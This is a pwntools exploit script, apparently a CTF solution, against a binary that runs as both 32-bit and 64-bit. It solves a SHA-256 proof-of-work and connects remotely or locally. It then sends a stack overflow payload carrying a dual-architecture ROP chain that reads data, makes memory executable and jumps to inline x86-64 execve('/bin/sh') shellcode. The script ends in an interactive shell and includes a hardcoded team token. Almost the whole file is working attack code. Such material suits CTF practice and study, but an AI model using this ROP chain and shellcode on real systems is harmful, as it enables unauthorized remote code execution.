#-*- coding: utf-8 -*-
from pwn import *
from hashlib import sha256

__author__ = '3summer'
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
irt     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))

context.terminal = ['tmux', 'sp', '-h', '-l', '110']
context.log_level = 'debug'
token = 'bfdccbebf86687951f6d37b3e5a35fe1'

def dbg(breakpoint):
    gdbscript = ''
    elf_base = 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdbscript += 'c\n'
    log.info(gdbscript)
    gdb.attach(io, gdbscript)
    time.sleep(1)

def pow():
    ru('.hexdigest()=')
    sha_256 = ru('\n')
    ru(".encode('hex')=")
    half = ru('\n').decode('hex')
    dic = [chr(i) for i in range(0x100)]
    ans = iters.mbruteforce(lambda x: sha256(half + x).hexdigest()==sha_256, dic, 3, 'fixed')
    sla("skr.encode('hex')=", (half+ans).encode('hex'))
    sla(':', token)

def exploit(io):
    print ru('it?\n')

    # 64位
    # dbg(0x400B33)
    int_0x80_x64 = 0x000000000044e82c
    pop_rax = 0x000000000043b97c
    pop_rdx = 0x000000000043b9d5
    pop_rdi = 0x00000000004005f6 
    pop_rsi = 0x0000000000405895
    read_plt = 0x43B9C0
    add_rsp = 0x00000000004079d4 # add rsp, 0xd8 ; ret

    # 32位
    # dbg(0x804892F)
    int_0x80_x86 = 0x080495a3
    add_esp = 0x0804f095 # add esp, 0x1c ; ret
    read_plt_32 = 0x0806C8E0
    pop_3_ret = 0x08055f54 # pop eax ; pop edx ; pop ebx ; ret
    pop_ecx = 0x0806e9f2 # pop ecx ; pop ebx ; ret

    rop_32 = p32(read_plt_32) + p32(pop_3_ret) + p32(0) + p32(0x80d7000) + p32(0x100) + p32(pop_ecx) + p32(0) + p32(0) + p32(pop_3_ret) + p32(0xb) + p32(0) + p32(0x80d7000) + p32(int_0x80_x86)
    # rop_64 = p64(read_plt) + p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(0x6a13e3) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(int_0x80_x64)
    rop_64 = p64(read_plt) + p64(pop_rdi) + p64(0x69e000) + p64(pop_rsi) + p64(0x6000) + p64(pop_rdx) + p64(7) + p64(0x43C7A0) + p64(0x6a13e3+8)
    payload = 'test'+'\x00'*0x108 + 'b'*4 + p32(add_esp) + 'c'*4 + p64(add_rsp) + 'd'*0x10 + rop_32.ljust(0xc8,'e') + rop_64
    #                                32_ret                  64_ret                   32_rop(0xc8)             64_rop
    s(payload)
    sa('test\n','/bin/sh\x00'+'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05')
    return io


if __name__ == '__main__':
    if len(sys.argv) > 2:
        io = remote(sys.argv[1], sys.argv[2])
        pow()
    else:
        io = process(sys.argv[1], 0)
    exploit(io)
    irt()


# https://mp.weixin.qq.com/s/6w9cW4k1m9SjEHyfP_maSg